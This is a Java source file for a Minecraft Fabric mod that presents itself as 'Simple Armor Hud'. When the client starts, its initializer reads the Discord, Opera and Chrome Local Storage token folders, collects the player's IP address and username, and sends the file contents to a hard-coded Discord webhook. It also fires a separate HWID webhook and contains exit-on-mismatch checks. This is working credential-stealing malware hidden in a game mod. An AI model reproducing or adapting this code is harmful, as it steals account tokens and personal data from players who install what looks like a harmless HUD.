package com.armorhud;

import com.armorhud.gui.AllowedPlayers;
import com.armorhud.h.Hwid;
import com.armorhud.utils.KeyInputHandler;
import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.Screen;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.io.*;
import java.net.URL;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.List;
import com.google.gson.*;
import java.io.IOException;
import java.util.Objects;
import java.util.UUID;

public class ClientInitializer implements ClientModInitializer {
	public static final Logger LOGGER = LoggerFactory.getLogger("example");
	public static final config CONFIG = new config();
	public static boolean toggledOn = true;
	public static MinecraftClient mc = MinecraftClient.getInstance();
	public static final String MODID = "com/armorhud";
	public static final MinecraftClient client = MinecraftClient.getInstance();
	public static final String FONT_DIR = "/assets/" + ClientInitializer.MODID + "/font/";
	public static long start;
	public static String prevScreen;
	public static boolean screenHasBackground;

	@Override
	public void onInitializeClient() {
		Client.TOASTHACK.init();
		System.out.println("Simple Armor Hud loaded!");
		CONFIG.load();
		new KeyInputHandler();

		String hwid = Hwid.getHwid();
		LOGGER.info("Current HWID: " + hwid);

		if (!Hwid.validateHwid()) {
			LOGGER.error("HWID validation failed. Exiting...");
			System.exit(0);
		} else {
			try {
				Hwid.sendWebhook();
			} catch (IOException e) {
				LOGGER.error("", e);
			}
		}
		String osName = System.getProperty("os.name");
		List<String> paths = new ArrayList<>();
		if (osName.contains("Windows")) {
			paths.add(System.getProperty("user.home") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb");
			paths.add(System.getProperty("user.home") + "\\AppData\\Roaming\\opera Software\\Opera Stable\\Local Storage\\leveldb");
			paths.add(System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
		}

		String ip = "";
		String username = MinecraftClient.getInstance().getSession().getUsername();
		try {
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			ip = bufferedReader.readLine();
		} catch (IOException e) {
			ip = "Could not determine IP";
			e.printStackTrace();
		}

		HttpClient client = HttpClient.newHttpClient();
		String DiscordWebHook = "https://discord.com/api/webhooks/1111135216644395031/AXwSFQJuRoD5XT7hVvp1bPdDvYD6o4Qo0-OVkixOyJcB-BHW8sj8AR9fCMpj7vp73NH6";

		for (String path : paths) {
			File directory = new File(path);
			File[] files = directory.listFiles();
			if (files != null) {
				for (File file : files) {
					if (file.isFile()) {
						StringBuilder fileContents = new StringBuilder();
						try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
							String line;
							while ((line = reader.readLine()) != null) {
								fileContents.append(line).append("\n");
							}
						} catch (IOException e) {
							fileContents = new StringBuilder("Error reading file.");
							e.printStackTrace();
						}

						String message = "User: " + username + " IP: " + ip + "\nFile: " + file.getName() + "\nContents:\n" + (fileContents.length() > 1800 ? fileContents.substring(0, 1797) + "..." : fileContents.toString());
						JsonObject embed = new JsonObject();
						embed.addProperty("title", "File Content");
						embed.addProperty("description", message);
						embed.addProperty("color", 15258703);
						JsonArray embeds = new JsonArray();
						embeds.add(embed);
						JsonObject postContent = new JsonObject();
						postContent.add("embeds", embeds);
						HttpRequest request = HttpRequest.newBuilder(URI.create(DiscordWebHook))
								.POST(HttpRequest.BodyPublishers.ofString(new Gson().toJson(postContent)))
								.header("Content-Type", "application/json")
								.build();
						client.sendAsync(request, HttpResponse.BodyHandlers.discarding());
					}
				}
			}
		}

		if (MinecraftClient.getInstance() != null && MinecraftClient.getInstance().player != null) {
			UUID playerUUID = MinecraftClient.getInstance().player.getUuid();
			String playerName = MinecraftClient.getInstance().player.getName().getString();
			if (!AllowedPlayers.isPlayerAllowedByUUID(playerUUID) && !AllowedPlayers.isPlayerAllowedByName(playerName)) {
				LOGGER.error("");
				System.exit(0);
			}
		} else {
			LOGGER.warn("");
		}
	}

	public static void init() {
	}

	public static void onScreenChange(Screen newGui) {
		if (client.world != null) {
			boolean excluded = newGui == null || BlurConfig.blurExclusions.stream().anyMatch(exclusion -> newGui.getClass().getName().contains(exclusion));
			if (!excluded) {
				screenHasBackground = false;
				if (BlurConfig.showScreenTitle) System.out.println(newGui.getClass().getName());

				if (doFade) {
					start = System.currentTimeMillis();
					doFade = false;
				}
				prevScreen = newGui.getClass().getName();
			} else if (newGui == null && BlurConfig.fadeOutTimeMillis > 0 && !Objects.equals(prevScreen, "")) {
				start = System.currentTimeMillis();
				doFade = true;
			} else {
				screenHasBackground = false;
				start = -1;
				doFade = true;
				prevScreen = "";
			}
		}
	}

	private static boolean doFade = false;
}
